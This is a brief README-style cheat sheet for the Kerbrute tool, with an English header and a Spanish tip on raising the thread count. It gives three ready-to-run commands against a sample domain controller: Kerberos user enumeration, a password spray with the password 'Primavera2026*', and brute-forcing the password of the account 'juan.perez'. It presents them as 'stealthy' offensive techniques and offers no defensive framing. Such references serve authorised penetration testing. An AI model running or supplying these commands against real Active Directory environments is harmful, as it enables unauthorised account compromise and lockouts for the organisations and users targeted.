<h1 align="center">Kerbrute Cheat Sheet</h1>

<p align="center">
  Fast reference guide for stealthy Active Directory user enumeration, password spraying, and brute-force workflows using Kerberos pre-authentication.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Linux-111827?style=for-the-badge&logo=linux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Kerberos-AD_Recon-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Attacks-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

</br>

> Rendimiento: Puedes acelerar los ataques usando el flag -t <hilos> (por defecto son 10). Ejemplo: -t 50.

</br>

```
kerbrute userenum -d miempresa.local --dc 192.168.1.10 usuarios.txt
```

```
kerbrute passwordspray -d miempresa.local --dc 192.168.1.10 usuarios_validos.txt 'Primavera2026*'
```

```
kerbrute bruteuser -d miempresa.local --dc 192.168.1.10 contraseñas.txt juan.perez
```

